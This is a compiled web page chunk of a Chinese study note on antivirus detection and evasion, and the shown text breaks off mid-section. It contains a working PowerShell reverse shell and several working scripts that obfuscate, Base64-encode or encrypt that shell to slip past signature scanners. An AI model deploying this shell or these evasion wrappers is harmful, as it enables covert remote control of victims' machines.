import{_ as l}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as p,o as i,c as o,a,d as n,b as e,e as t}from"./app-DxMJFouC.js";const c={},r=t('<h1 id="杀毒与免杀" tabindex="-1"><a class="header-anchor" href="#杀毒与免杀"><span>杀毒与免杀</span></a></h1><hr><ul><li><a href="#%E6%9D%80%E6%AF%92%E4%B8%8E%E5%85%8D%E6%9D%80">杀毒与免杀</a><ul><li><a href="#%E6%9C%A8%E9%A9%AC%E6%A6%82%E8%BF%B0">木马概述</a><ul><li><a href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9A%E4%B9%89">木马的定义</a></li><li><a href="#%E6%9C%A8%E9%A9%AC%E6%84%9F%E6%9F%93%E7%9A%84%E8%BF%87%E7%A8%8B">木马感染的过程</a></li><li><a href="#%E6%9C%A8%E9%A9%AC%E7%A4%BA%E4%BE%8B">木马示例</a></li></ul></li><li><a href="#%E7%89%B9%E5%BE%81%E7%A0%81%E6%9F%A5%E6%9D%80">特征码查杀</a><ul><li><a href="#%E5%8A%A0%E5%A3%B3">加壳</a><ul><li><a href="#%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86">代码混淆</a></li><li><a href="#%E7%BC%96%E7%A0%81%E6%88%96%E5%8A%A0%E5%AF%86">编码或加密</a><ul><li><a href="#base64%E7%BC%96%E7%A0%81">Base64编码</a></li><li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E5%AF%86">自定义加密</a></li></ul></li><li><a href="#%E5%A1%AB%E5%85%85%E5%90%88%E6%B3%95%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">填充合法的系统命令</a></li><li><a href="#%E5%88%A9%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1">利用第三方服务</a></li><li><a href="#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C">时间延迟执行</a></li><li><a href="#%E5%88%86%E5%89%B2%E5%92%8C%E5%88%86%E6%95%A3%E4%BB%A3%E7%A0%81">分割和分散代码</a></li></ul></li></ul></li><li><a href="#%E5%90%AF%E5%8F%91%E5%BC%8F%E5%88%86%E6%9E%90">启发式分析</a></li><li><a href="#%E6%B2%99%E7%9B%92%E5%88%86%E6%9E%90">沙盒分析</a></li><li><a href="#%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%B5%8B">行为监测</a><ul><li><a href="#amsi">AMSI</a><ul><li><a href="#amsi-bypass">AMSI Bypass</a></li><li><a href="#%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%A6%81%E7%94%A8-amsi">改注册表禁用 AMSI</a></li><li><a href="#%E9%80%9A%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%8E%A5%E5%8F%A3%E5%85%B3%E9%97%ADamsi">通过命名空间接口关闭AMSI</a></li></ul></li><li><a href="#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C-1">时间延迟执行</a></li><li><a href="#%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91">条件触发</a></li><li><a href="#%E8%A1%8C%E4%B8%BA%E5%85%8D%E6%9D%80">行为免杀</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E5%86%B7%E9%97%A8%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0">使用冷门方法实现</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E9%87%8D%E5%91%BD%E5%90%8D-powershell">拷贝重命名 powershell</a></li></ul></li><li><a href="#%E4%BA%91%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90">云基础分析</a></li><li><a href="#ai%E5%88%86%E6%9E%90">AI分析</a></li></ul></li></ul><hr>',4),u={href:"https://www.freebuf.com/articles/others-articles/336601.html",target:"_blank",rel:"noopener noreferrer"},d=a("hr",null,null,-1),k={href:"https://www.virustotal.com/gui/home/upload",target:"_blank",rel:"noopener noreferrer"},v=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280212445.png" alt="image-20231228021206407"></p><hr><h2 id="木马概述" tabindex="-1"><a class="header-anchor" href="#木马概述"><span>木马概述</span></a></h2><h3 id="木马的定义" tabindex="-1"><a class="header-anchor" href="#木马的定义"><span>木马的定义</span></a></h3><p>木马是一种隐藏在看似合法软件中的恶意软件，它在用户不知情的情况下执行未授权的活动。这种名称来源于古希腊的特洛伊木马故事，象征着通过欺骗手段渗透和破坏。</p><p>与病毒和蠕虫不同</p><ul><li>木马将自己伪装成合法的软件或文件, 欺骗用户主动执行它</li><li>病毒能够自我复制并插入其他程序中, 需要宿主文件来复制和传播</li><li>蠕虫不需要宿主文件, 可以自我复制和传播, 它们的主要目的是尽可能地复制和传播自身</li></ul><hr><h3 id="木马感染的过程" tabindex="-1"><a class="header-anchor" href="#木马感染的过程"><span>木马感染的过程</span></a></h3><p>木马通常通过伪装成合法软件或附件来诱骗用户下载和执行。一旦激活，它们可以执行各种恶意活动，如窃取数据、监控用户活动或创建后门</p><blockquote><p>钓鱼邮件, WallpaperEngine投毒</p></blockquote><hr><h3 id="木马示例" tabindex="-1"><a class="header-anchor" href="#木马示例"><span>木马示例</span></a></h3><p>远程访问木马(RAT - Remote Access Trojan) 是一种允许攻击者远程控制受感染计算机的恶意软件</p><p>传统的防火墙设计通常认为出站连接(由内部网络向外部网络发起的连接)是安全的, 而外部对内部网络的直接访问可能是危险的; RAT 通常使用反向连接使得受感染主机主动连接攻击者服务器来绕过防火墙在这方面的防护</p><p>可以使用 PowerShell 实现</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 创建一个 TCP 客户端对象, 尝试连接到 192.168.159.1 的 4444 端口</span>
<span class="token variable">$client</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">&quot;192.168.159.1&quot;</span><span class="token punctuation">,</span> 4444<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 从 TCP 客户端对象中获取流对象, 用于接收和发送数据</span>
<span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 创建一个64KB的字节数组, 用于接收数据(每个字节都是0)</span>
<span class="token namespace">[byte[]]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535 <span class="token punctuation">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> 0 <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment"># 持续从网络流中读取数据</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment"># 将字节数组转换为字符串</span>
    <span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment"># 执行字符串中的命令, 并将结果转换为字符串</span>
    <span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2&gt;&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment"># 将执行结果和一个提示符附加到输出中</span>
    <span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">&quot;PS &quot;</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">;</span>
    <span class="token comment"># 将输出字符串转换为字节</span>
    <span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment"># 将字节写入网络流中</span>
    <span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment"># 刷新网络流</span>
    <span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment"># 在完成通信后关闭TCP连接</span>
<span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>[byte[]]$bytes = 0..65535 | % { 0 }</code><ul><li><code>0..65535</code>: 创建了一个包含从0到65535的整数序列</li><li><code>% { 0 }</code>: PowerShell中的ForEach-Object命令的简短写法<br> 对序列中的每个元素执行括号内的操作(返回0)</li></ul></li><li><code>$sendback = (iex $data 2&gt;&amp;1 | Out-String )</code><ul><li><code>2&gt;&amp;1</code>: 在PowerShell中，2 表示标准错误流(stderr) ，1 表示标准输出流(stdout)<br><code>2&gt;&amp;1</code> 表示将标准错误流重定向到标准输出流, 这意味着命令的输出和错误都会被捕获并重定向为字符串到 <code>$sendback</code></li></ul></li><li><code>$stream.Write($sendbyte,0,$sendbyte.Length)</code><ul><li><code>Write</code> 是 <code>System.Net.Sockets.NetworkStream</code> 对象的一个方法，用于将数据写入网络流;<br> 这个方法需要三个参数：<code>要写入的字节数据</code>, <code>字节数组中开始写入数据的位置</code>, <code>要写入的字节数量</code></li></ul></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020157367.png" alt="image-20240102015739253"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020159078.png" alt="image-20240102015956053"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020259436.png" alt="image-20240102025931311"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020159890.png" alt="image-20240102015917847"></p><blockquote><p>360 的离线查杀似乎不太好用</p></blockquote>`,23),m={href:"https://s.threatbook.com/report/file/f403aea15df24095b3270a5572191f77a02664b7b0792e8f2d229a5a4895a1b5",target:"_blank",rel:"noopener noreferrer"},h=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151745427.png" alt="image-20240115174529326"></p><hr><h2 id="特征码查杀" tabindex="-1"><a class="header-anchor" href="#特征码查杀"><span>特征码查杀</span></a></h2><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280115873.jpeg" alt="1.png"></p><p>杀软公司通过各种毒经获得病毒样本并确认为病毒后会提取这个病毒文件的特征码用于唯一标识这个文件</p><p>例如最简单的文件哈希, 或是文件中唯一存在的一段字符串</p><p>这种方式可以用来防范一些已知的恶意软件,病毒文件</p><hr><p>以查杀上述 RAT 示例为例, 如果这是一个比较知名的木马, 那么首先可以检查其哈希来匹配已知的木马哈希</p><p>除此以外, 可以看到这个示例中的RAT使用了一些特定的PowerShell命令和结构，这些可以被用来创建特征码</p><p>例如:</p><ul><li><code>New-Object System.Net.Sockets.TCPClient</code> 用于建立网络连接, 特别是当它连接到一个固定的IP地址端口时</li><li><code>iex</code>(Invoke-Expression的缩写) 用于执行字符串中的命令, 尤其是当它与网络功能结合使用时</li></ul><p>那么可以创建一个特征码, 用于检测包含 <code>New-Object System.Net.Sockets.TCPClient</code> 和 <code>iex</code> 命令组合的脚本</p><hr><h3 id="加壳" tabindex="-1"><a class="header-anchor" href="#加壳"><span>加壳</span></a></h3><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280124792.jpeg" alt="2.png"></p><p>由于基于特征码的查杀依赖于匹配恶意软件的已知特征码或签名, 因此如果将恶意软件的代码进行加密混淆(&quot;加壳&quot;), 然后执行的时候进行动态的解密(&quot;解壳&quot;)就可以绕过这种基于特征码的静态分析</p><hr><h4 id="代码混淆" tabindex="-1"><a class="header-anchor" href="#代码混淆"><span>代码混淆</span></a></h4><ul><li><p>攻击者可以使用混淆技术来改变脚本的外观，使其特征码不再匹配</p></li><li><p>例如，使用不寻常的变量名、分解字符串、动态构造命令等方法</p></li></ul><hr><p>以 <code>字符串拆分与重组</code> 为例</p><p>PowerShell允许动态构造并执行字符串形式的命令，即使命令被拆分成多个部分，它们仍然可以被重新组合并执行;</p><p>例如:</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token function">Invoke-Expression</span> <span class="token string">&quot;whoami&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020226149.png" alt="image-20240102022636132"></p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$p1</span> = <span class="token string">&quot;who&quot;</span>
<span class="token variable">$p2</span> = <span class="token string">&quot;ami&quot;</span>
<span class="token variable">$cmd</span> = <span class="token variable">$p1</span> <span class="token operator">+</span> <span class="token variable">$p2</span>
<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020228304.png" alt="image-20240102022842255"></p><p>举个极端例子, 可以将原始脚本中的命令逐个字符进行切分然后拼接后使用 IEX 执行:</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 使用PowerShell读取 RATSample.ps1 文件中的内容</span>
<span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../../RATSample.ps1&quot;</span>
<span class="token comment"># 将脚本中的每个字符分解为单独的元素</span>
<span class="token variable">$splitScript</span> = <span class="token variable">$originalScript</span><span class="token punctuation">.</span>ToCharArray<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 遍历每个字符，创建一个将这些字符重新组合的脚本</span>
<span class="token variable">$obfuscatedScript</span> = <span class="token string">&quot;&quot;</span>
<span class="token variable">$counter</span> = 1
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$char</span> in <span class="token variable">$splitScript</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$varName</span> = <span class="token string">&quot;var&quot;</span> <span class="token operator">+</span> <span class="token variable">$counter</span>
    <span class="token variable">$obfuscatedScript</span> <span class="token operator">+=</span> <span class="token string">&quot;\`$<span class="token variable">$varName</span> = &#39;<span class="token variable">$char</span>&#39;; &quot;</span>
    <span class="token variable">$counter</span><span class="token operator">++</span>
<span class="token punctuation">}</span>
<span class="token variable">$obfuscatedScript</span> <span class="token operator">+=</span> <span class="token string">&quot;\`<span class="token variable">$cmd</span> = &quot;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 1<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$counter</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$obfuscatedScript</span> <span class="token operator">+=</span> <span class="token string">&quot;\`<span class="token variable">$var</span><span class="token variable">$i</span> + &quot;</span>
<span class="token punctuation">}</span>
<span class="token variable">$obfuscatedScript</span> = <span class="token variable">$obfuscatedScript</span><span class="token punctuation">.</span>TrimEnd<span class="token punctuation">(</span><span class="token string">&quot; + &quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;; iex \`<span class="token variable">$cmd</span>&quot;</span>
<span class="token comment"># 将生成的混淆脚本写入到一个新文件</span>
<span class="token variable">$obfuscatedScript</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;Obfuscated_RAT.ps1&quot;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020237725.png" alt="image-20240102023733691"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020238563.png" alt="image-20240102023841467"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020239799.png" alt="image-20240102023922769"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020241601.png" alt="image-20240102024101569"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020243445.png" alt="image-20240102024318383"></p><hr>`,36),b={href:"https://s.threatbook.com/report/file/7b59dc64c8410f955e918f886ebcc066ce2eddeb76737b893e82988c83c34307",target:"_blank",rel:"noopener noreferrer"},E=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151746203.png" alt="image-20240115174645870"></p><hr><h4 id="编码或加密" tabindex="-1"><a class="header-anchor" href="#编码或加密"><span>编码或加密</span></a></h4><ul><li><p>将脚本或其关键部分进行编码或加密，以避免被基于文本匹配的特征码检测。</p></li><li><p>在运行时对这些部分进行解码或解密，执行原始的恶意操作。</p></li></ul><hr><h5 id="base64编码" tabindex="-1"><a class="header-anchor" href="#base64编码"><span>Base64编码</span></a></h5><p>例如将整个 RATSample 进行 Base64 编码然后执行</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 读取原始RAT脚本</span>
<span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../../RATSample.ps1&quot;</span> <span class="token operator">-</span>Raw

<span class="token comment"># 将脚本转换为Base64编码</span>
<span class="token variable">$encodedScript</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token namespace">[Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$originalScript</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 准备新脚本的内容，该脚本将解码并执行原始脚本</span>
<span class="token variable">$decodedExecuteScript</span> = @<span class="token string">&quot;
\`<span class="token variable">$decodedScript</span> = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;<span class="token variable">$encodedScript</span>&#39;))
Invoke-Expression \`<span class="token variable">$decodedScript</span>
&quot;</span>@

<span class="token comment"># 将新脚本内容写入文件</span>
<span class="token variable">$decodedExecuteScript</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;EncodedRAT.ps1&quot;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020309607.png" alt="image-20240102030956575"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020312126.png" alt="image-20240102031203051"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020315790.png" alt="image-20240102031520703"></p>`,11),g={href:"https://s.threatbook.com/report/file/e1910e688ccdce21396cfc2d44012ac4520dc6c6a2508c8dd14948e3e0411ac0",target:"_blank",rel:"noopener noreferrer"},A=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151804395.png" alt="image-20240115180448559"></p><hr><h5 id="自定义加密" tabindex="-1"><a class="header-anchor" href="#自定义加密"><span>自定义加密</span></a></h5><p>攻击者可以自定义加解密方案, 例如读取 RATSample.ps1, 将其中所有字符的 ASCII 码 +1 然后补齐 3 位生成一串加密指令然后对应解码执行</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../../RATSample.ps1&quot;</span> <span class="token operator">-</span>Raw
<span class="token function">Write-Host</span> <span class="token variable">$originalScript</span>
<span class="token variable">$encryptedScript</span> = <span class="token punctuation">(</span><span class="token variable">$originalScript</span><span class="token punctuation">.</span>ToCharArray<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span>
    <span class="token variable">$asciiValue</span> = <span class="token namespace">[int]</span><span class="token namespace">[char]</span><span class="token variable">$_</span> <span class="token operator">+</span> 1
    <span class="token variable">$asciiValue</span><span class="token punctuation">.</span>ToString<span class="token punctuation">(</span><span class="token string">&quot;D3&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">-join</span> <span class="token string">&#39;&#39;</span>
<span class="token variable">$decryptionScript</span> = @<span class="token string">&quot;
\`<span class="token variable">$encryptedScript</span> = &#39;<span class="token variable">$encryptedScript</span>&#39;
\`<span class="token variable">$decryptedScript</span> = &#39;&#39;
for (\`<span class="token variable">$i</span> = 0; \`<span class="token variable">$i</span> -lt \`<span class="token variable">$encryptedScript</span>.Length; \`<span class="token variable">$i</span>+=3) {
    \`<span class="token variable">$asciiValue</span> = [int]::Parse(\`<span class="token variable">$encryptedScript</span>.Substring(\`<span class="token variable">$i</span>, 3)) - 1
    \`<span class="token variable">$decryptedScript</span> += [char]\`<span class="token variable">$asciiValue</span>
}
Invoke-Expression \`<span class="token variable">$decryptedScript</span>
&quot;</span>@

<span class="token variable">$decryptionScript</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;EncryptedRAT.ps1&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020335834.png" alt="image-20240102033515761"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020341871.png" alt="image-20240102034136813"></p><hr>`,8),f={href:"https://s.threatbook.com/report/file/4673839b2e1403c7c1cad50913517f3e9e7d3e4491da36cebac882051a0ba749",target:"_blank",rel:"noopener noreferrer"},B=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151812539.png" alt="image-20240115181202403"></p><hr><h4 id="填充合法的系统命令" tabindex="-1"><a class="header-anchor" href="#填充合法的系统命令"><span>填充合法的系统命令</span></a></h4><p>和填充脏数据差不多的意思, 通过填充大量合法指令来混淆视听, 例如</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$repeatedCommands</span> = @<span class="token punctuation">(</span>
    <span class="token string">&quot;&#39;Get-Host&#39;&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;&#39;Get-Date&#39;&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;&#39;Get-Service&#39;&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;&#39;Get-Process&#39;&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;&#39;Get-EventLog -LogName System&#39;&quot;</span>
<span class="token punctuation">)</span> <span class="token operator">*</span> 100 <span class="token comment"># 重复100次</span>
<span class="token variable">$originalScript</span> = <span class="token function">Get-Content</span> <span class="token operator">-</span>Path <span class="token string">&quot;../RATSample.ps1&quot;</span> <span class="token operator">-</span>Raw
<span class="token variable">$obfuscatedScript</span> = <span class="token variable">$repeatedCommands</span> <span class="token operator">+</span> <span class="token variable">$originalScript</span> <span class="token operator">+</span> <span class="token variable">$repeatedCommands</span>
<span class="token variable">$obfuscatedScript</span> <span class="token operator">-join</span> <span class="token string">&quot;\`n&quot;</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>FilePath <span class="token string">&quot;ObfuscatedRAT.ps1&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020411240.png" alt="image-20240102041132197"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020411712.png" alt="image-20240102041117645"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020408407.png" alt="image-20240102040837354"></p><hr>`,9),S={href:"https://s.threatbook.com/report/file/09a7291d125fc95428ce138099d84806702e6d77c8e8e2e4fa429769adcb8893",target:"_blank",rel:"noopener noreferrer"},$=t('<p>微步标了个可疑</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202401151813457.png" alt="image-20240115181311714"></p><hr><h4 id="利用第三方服务" tabindex="-1"><a class="header-anchor" href="#利用第三方服务"><span>利用第三方服务</span></a></h4><p>使用合法的第三方服务作为C&amp;C(命令和控制) 通信，比如社交媒体、合法的云服务等，以隐藏恶意流量。</p><hr><h4 id="时间延迟执行" tabindex="-1"><a class="header-anchor" href="#时间延迟执行"><span>时间延迟执行</span></a></h4><ul><li>在脚本中加入延迟执行的代码，使恶意行为不会立即发生，这样在静态分析时看起来不会有恶意行为。</li></ul><hr><h4 id="分割和分散代码" tabindex="-1"><a class="header-anchor" href="#分割和分散代码"><span>分割和分散代码</span></a></h4><ul><li>将恶意功能分割成多个看似无害的部分，分别嵌入到不同的脚本或程序中，在特定条件下才组合执行。</li></ul><hr><h2 id="启发式分析" tabindex="-1"><a class="header-anchor" href="#启发式分析"><span>启发式分析</span></a></h2><p>启发式分析是一种相较于特征码查杀更先进的<code>静态</code>检测方法, 可以用来识别尚未知晓的病毒或变种</p><p>它通过分析程序的行为和代码结构来预测其潜在恶意性</p><p>如果一个程序的行为类似已知的恶意软件, 或者试图执行可疑的操作(如修改重要的系统文件), 那么就可以标记其为潜在的威胁</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280201628.jpeg" alt="5.png"></p><p>静态启发式分析指的实在静止状态下通过对病毒的典型指令特征识别病毒的方法, 是对传统特征码扫描的补充</p><p>在不运行病毒木马的情况下, 进行简单的反汇编, 查找, 匹配是否出现病毒木马指定的指令或者 API 函数调用序列来分析该文件是否为病毒</p><hr><h2 id="沙盒分析" tabindex="-1"><a class="header-anchor" href="#沙盒分析"><span>沙盒分析</span></a></h2><p>杀软会在一个隔离的环境(沙盒)中运行程序</p><p>这允许软件观察程序的行为而不影响实际的操作系统或文件</p><p>如果程序在沙盒中表现出恶意行为, 杀毒软件会将其识别为威胁</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280206229.jpeg" alt="6.png"></p><p>动态启发式通过杀软内置的虚拟机技术，给病毒构建一个仿真的运行环境，诱使病毒在杀软的模拟缓冲区中运行，运行过程中监控程序的行为。这种方法能够全面、有效地采集程序行为，从而综合判断程序是否是病毒</p><hr><h2 id="行为监测" tabindex="-1"><a class="header-anchor" href="#行为监测"><span>行为监测</span></a></h2><p>杀软会监控系统上的活动, 寻找与恶意软件行为相似的模式; 例如大量访问个人数据可能会触发警报</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202312280155209.jpeg" alt="3.png"></p><p>或者说, 当病毒木马加载到内存后, 脱去外壳, 还原为真实的数据, 此时杀软再对内存中的数据进行查杀, 匹配特征</p><blockquote><p>和前面的启发式分析中提到的关注程序的行为需要区分</p><ul><li><code>启发式分析</code> 仍旧是一种静态的检测方式, 主要针对程序的代码和结构进行分析, 寻找其和已知恶意软件相似的特征</li><li><code>行为监测</code> 